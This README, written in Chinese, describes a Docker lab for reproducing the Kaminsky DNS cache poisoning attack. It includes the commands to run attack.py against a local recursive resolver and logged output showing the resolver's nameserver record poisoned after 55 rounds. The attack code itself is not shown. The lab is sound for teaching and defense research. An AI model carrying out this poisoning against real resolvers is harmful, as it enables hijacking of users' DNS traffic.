# kaminsky
## 说明
本仓库环境用于本地复现kaminsky攻击

## 环境搭建
```shell
docker compose up --build
```

## 实验复现
- 开启echo服务伪装为带有延迟的DNS权威服务器
    ```shell
    docker compose exec -it attacker python3 echo.py &

    # --- Slow DNS Echo Server ---
    [*] Preparing to listen on 0.0.0.0:53...
    [*] Each request will be responded to after a 0.5 second delay

    [*] Server started successfully, listening on port 53..
    ```

- 默认情况下，`recursor`的根服务器地址指向`attacker`(`10.10.0.8`)，无法正常解析`www.example.com`
    ```shell
    docker compose exec -it attacker dig @10.10.0.6 www.example.com

    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.10.0.6 www.example.com
    ; (1 server found)
    ;; global options: +cmd
    ;; no servers could be reached
    # dig @10.10.0.6 www.example.com
    ;; communications error to 10.10.0.6#53: timed out
    ;; communications error to 10.10.0.6#53: timed out
    ;; communications error to 10.10.0.6#53: timed out

    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.10.0.6 www.example.com
    ; (1 server found)
    ;; global options: +cmd
    ;; no servers could be reached
    ```

- 尝试投毒，将递归解析器的`ns-auth.example.com`缓存部分改为`auth`(`10.10.0.7`)，该地址部署了一个正常的权威服务器，可以响应`www.example.com`
    ```shell
    docker compose exec -it attacker python3 attack.py 10.10.0.6 example.com 10.10.0.7 -l -d 10.10.0.8

    Victim DNS: 10.10.0.6
    Target domain: example.com
    Spoofing IP: 10.10.0.7
    Method: loud

    Starting sequence

    Initializing multiprocessing pool with 32 worker processes.
    Starting loud attack. This may take a while...
    Attack round 1: Triggering query for 047wtn8nq4.example.com
    ```

- 投毒成功后，脚本将自动停止，显示轮数，以及投毒耗时
    ```shell
    ...
    Attack round 54: Triggering query for 74phcnksqt.example.com
    ...
    Attack round 55: Triggering query for rk7i3s4nkh.example.com
    SUCCESS! Cache poisoned for ns-auth.example.com -> 10.10.0.7
    It took: 0:05:19.464771
    ```

- 验证是否可以正常获取`www.example.com`地址
    ```shell
    docker compose exec -it attacker dig @10.10.0.6 www.example.com

    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.10.0.6 www.example.com
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26889
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4096
    ;; QUESTION SECTION:
    ;www.example.com.               IN      A

    ;; ANSWER SECTION:
    www.example.com.        86400   IN      A       1.2.3.4

    ;; AUTHORITY SECTION:
    example.com.            86352   IN      NS      ns-auth.example.com.

    ;; ADDITIONAL SECTION:
    ns-auth.example.com.    86352   IN      A       10.10.0.7

    ;; Query time: 0 msec
    ;; SERVER: 10.10.0.6#53(10.10.0.6) (UDP)
    ;; WHEN: Sun Aug 03 03:06:06 UTC 2025
    ;; MSG SIZE  rcvd: 98
    ```